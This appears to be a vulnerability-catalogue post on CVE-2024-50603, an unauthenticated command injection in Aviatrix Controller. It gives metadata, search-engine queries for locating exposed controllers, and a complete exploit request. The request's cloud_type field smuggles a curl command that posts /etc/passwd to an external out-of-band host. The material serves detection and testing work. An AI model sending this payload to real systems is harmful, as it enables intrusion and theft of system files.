---
layout: "post"
cve_id: "CVE-2024-50603"
title: "Aviatrix Controller - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-50603.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-50603.yaml"
author: "newlinesec,securing.pl"
severity: "critical"
reference:
  - "https://www.securing.pl/en/cve-2024-50603-aviatrix-network-controller-command-injection-vulnerability/"
  - "https://docs.aviatrix.com/documentation/latest/network-security/index.html"
  - "https://docs.aviatrix.com/documentation/latest/release-notices/psirt-advisories/psirt-advisories.html?expand=true#remote-code-execution-vulnerability-in-aviatrix-controllers"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-50603"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
  cvss-score: 10
  cve-id: "CVE-2024-50603"
  cwe-id: "CWE-78"
  epss-score: 0.94352
  epss-percentile: 0.99953
metadata:
  verified: True
  max-request: 1
  vendor: "aviatrix"
  product: "controller"
  shodan-query: ['http.title:"aviatrix controller"', 'http.title:"aviatrix cloud controller"']
  fofa-query: ['app="aviatrix-controller"', 'title="aviatrix cloud controller"']
  google-query: "intitle:\"aviatrix cloud controller\""
  zoomeye-query: "app=\"Aviatrix Controller\""
tags:
  - "cve"
  - "cve2024"
  - "aviatrix"
  - "controller"
  - "rce"
  - "oast"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
An issue was discovered in Aviatrix Controller before 7.1.4191 and 7.2.x before 7.2.4996. Due to the improper neutralization of special elements used in an OS command, an unauthenticated attacker is able to execute arbitrary code. Shell metacharacters can be sent to /v1/api in cloud_type for list_flightpath_destination_instances, or src_cloud_type for flightpath_connection_test.


## üåê HTTP Request
```nohighlight
POST /v1/api HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Length: 194
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+-X+POST+-d+@/etc/passwd+d4t7b31le0o67f39ms40c5fpn8tt65z5i.oast.site)
```


